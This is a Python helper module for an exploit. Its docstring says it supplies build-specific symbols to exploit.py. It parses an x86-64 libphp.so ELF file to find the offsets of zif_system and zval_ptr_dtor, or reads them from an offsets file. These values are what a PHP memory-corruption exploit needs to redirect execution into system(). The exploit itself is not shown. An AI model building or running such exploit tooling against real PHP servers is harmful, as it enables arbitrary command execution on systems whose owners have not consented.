"""Read the two build-specific symbols needed by exploit.py."""

from __future__ import annotations

import struct
from pathlib import Path


def _range(data: bytes, start: int, size: int) -> None:
    if start < 0 or size < 0 or start + size > len(data):
        raise ValueError("truncated ELF file")


def from_libphp(path: str) -> tuple[int, int]:
    data = Path(path).read_bytes()
    if len(data) < 64 or data[:6] != b"\x7fELF\x02\x01" or data[18:20] != b"\x3e\x00":
        raise ValueError("expected an x86-64 little-endian libphp.so")

    phoff, = struct.unpack_from("<Q", data, 0x20)
    shoff, = struct.unpack_from("<Q", data, 0x28)
    phsize, phcount = struct.unpack_from("<HH", data, 0x36)
    shsize, shcount = struct.unpack_from("<HH", data, 0x3A)
    if phsize < 56 or shsize < 64:
        raise ValueError("invalid ELF table sizes")
    _range(data, phoff, phsize * phcount)
    _range(data, shoff, shsize * shcount)

    bases = []
    for index in range(phcount):
        offset = phoff + index * phsize
        segment_type, = struct.unpack_from("<I", data, offset)
        address, = struct.unpack_from("<Q", data, offset + 16)
        length, = struct.unpack_from("<Q", data, offset + 40)
        if segment_type == 1 and length:
            bases.append(address)
    if not bases:
        raise ValueError("ELF has no load segment")

    sections = []
    for index in range(shcount):
        offset = shoff + index * shsize
        section_type, = struct.unpack_from("<I", data, offset + 4)
        file_offset, length = struct.unpack_from("<QQ", data, offset + 24)
        link, = struct.unpack_from("<I", data, offset + 40)
        entry_size, = struct.unpack_from("<Q", data, offset + 56)
        if section_type != 8:  # SHT_NOBITS occupies memory, not file bytes.
            _range(data, file_offset, length)
        sections.append((section_type, file_offset, length, link, entry_size))

    symbols: dict[str, int] = {}
    wanted = {"zif_system", "zval_ptr_dtor"}
    for section_type, file_offset, length, link, entry_size in sections:
        if section_type not in (2, 11) or link >= len(sections):
            continue
        if entry_size < 24:
            continue
        _, string_offset, string_length, _, _ = sections[link]
        string_end = string_offset + string_length
        for index in range(length // entry_size):
            symbol_offset = file_offset + index * entry_size
            name_offset, = struct.unpack_from("<I", data, symbol_offset)
            value, = struct.unpack_from("<Q", data, symbol_offset + 8)
            start = string_offset + name_offset
            if not name_offset or start >= string_end:
                continue
            end = data.find(b"\x00", start, string_end)
            if end < 0:
                continue
            name = data[start:end].decode("ascii", "replace")
            if name in wanted and name not in symbols:
                symbols[name] = value

    if symbols.keys() != wanted:
        raise ValueError("libphp.so is missing zif_system or zval_ptr_dtor")
    base = min(bases)
    zif, dtor = symbols["zif_system"] - base, symbols["zval_ptr_dtor"] - base
    if zif <= 0 or dtor <= 0:
        raise ValueError("invalid libphp symbol offsets")
    return zif, dtor


def from_file(path: str) -> tuple[int, int]:
    values: dict[str, int] = {}
    for line in Path(path).read_text(encoding="ascii").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        key, separator, value = line.partition("=")
        if not separator or key not in ("ZIF_OFFSET", "DTOR_OFFSET") or key in values:
            raise ValueError("offsets file must contain one ZIF_OFFSET and one DTOR_OFFSET")
        values[key] = int(value.strip(), 0)
    if values.keys() != {"ZIF_OFFSET", "DTOR_OFFSET"}:
        raise ValueError("offsets file must contain ZIF_OFFSET and DTOR_OFFSET")
    if any(value <= 0 or value >= 2**64 for value in values.values()):
        raise ValueError("offsets must be positive 64-bit integers")
    return values["ZIF_OFFSET"], values["DTOR_OFFSET"]
